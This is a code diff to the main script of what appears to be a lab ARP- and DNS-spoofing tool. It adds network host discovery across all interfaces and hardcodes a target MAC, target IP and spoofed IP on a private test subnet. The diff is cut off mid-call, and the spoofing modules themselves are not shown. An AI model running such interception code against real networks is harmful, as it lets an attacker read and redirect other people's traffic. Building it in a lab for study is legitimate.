@@ -1,12 +1,19 @@
 from src import arp_spoof as arp
 from src import dns_spoof as dns
+from src import discover
 from scapy.arch import get_if_list
 
+hosts = dict()
+
 if __name__ == '__main__':
-    interfaces = get_if_list()
-    print(interfaces)
+    for interface in get_if_list():
+        hosts[interface] = dict()
+        disc = discover.Discover(hosts, interface)
+        disc.start()
+        disc.active()
+
     arp_spoofing = arp.ARPSpoofing(
-        interface=interfaces[2],
+        interface="enp0s3",
         target_mac="08:00:27:b7:c4:af",
         target_ip="192.168.56.101",
         spoofed_ips=["192.168.56.102"],
